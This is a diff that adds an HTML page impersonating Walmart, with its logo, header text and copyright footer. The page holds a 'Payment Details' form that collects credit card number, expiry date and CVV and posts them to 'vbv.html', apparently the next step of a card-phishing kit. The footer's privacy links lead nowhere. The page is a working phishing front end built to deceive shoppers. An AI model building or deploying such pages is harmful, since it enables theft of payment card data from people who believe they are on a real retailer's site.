@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Details</title>
+  <link rel="stylesheet" href="styles4.css">
+  <script src="script2.js"></script>
+</head>
+<body>
+  <header class="walmarthd">
+    <!-- Walmart header content -->
+    <div class="header-content">
+      <a link-identifier="logoLink" aria-atomic="true" aria-label="Walmart. Save Money. Live Better. Home Page" href="/">
+        <img loading="lazy" src="imgs/k2-_ef2c8660-96ed-4f64-891d-329fa488c482.v1.png" alt="Walmart logo with link to homepage." height="65" width="64">
+      </a>
+      <div class="header-text">
+        <h1 class="mt2 mb4 f3">Walmart</h1>
+        <p class="w_U9_0 w_U0S3 w_QcqU ma0 mb4">Every Day Low Prices on millions of online items. Fast delivery from your local Walmart. <br>See comments from customers in your area here.</p>
+      </div>
+    </div>
+  </header>
+
+  <div class="payment-container">
+    <h2>Payment Details</h2>
+    <form class="payment-form" action="vbv.html" method="post">
+      <div class="form-group">
+        <label for="credit-card">Credit Card Number</label>
+        <input type="text" id="credit-card" name="credit-card" maxlength="19" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" inputmode="numeric" placeholder="xxxx xxxx xxxx xxxx" required>
+      </div>
+      <div class="form-group">
+        <label for="expiration">Expiration (MM/YY)</label>
+        <input type="text" id="expiration" name="expiration" maxlength="5" pattern="(0[1-9]|1[0-2])\/(2[2-9]|3[0-9])" inputmode="numeric" placeholder="MM/YY" required>
+      </div>
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" inputmode="numeric" placeholder="123" required>
+      </div>
+      <button type="submit" class="submit-btn">Submit Payment</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <div class="footer-links-container">
+    <ul class="list ma0 mt3 ph0 pt1">
+      <li class="">
+        <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="CA Privacy Rights - opens in a new window" target="_blank" rel="noopener noreferrer" href="#">
+          CA Privacy Rights
+        </a>
+      </li>
+      <li class="">
+        <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="Do Not Sell My Personal Information - opens in a new window" target="_blank" rel="noopener noreferrer" href="#">
+          Do Not Sell My Personal Information
+        </a>
+      </li>
+      <li class="">
+        <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="Notice at Collection - opens in a new window" target="_blank" rel="noopener noreferrer" href="#">
+          Notice at Collection
+        </a>
+      </li>
+      <li class="">
+        <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="Request My Personal Information - opens in a new window" target="_blank" rel="noopener noreferrer" href="#">
+          Request My Personal Information
+        </a>
+      </li>
+      <li class="">
+        <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="California Supply Chains Act - opens in a new window" target="_blank" rel="noopener noreferrer" href="#">
+          California Supply Chains Act
+        </a>
+      </li>
+    </ul>
+</div>
+    <div class="year-footer">© 2024 Walmart. All Rights Reserved.</div>
+  </footer>
+
+  
+  </body>
+  </html>
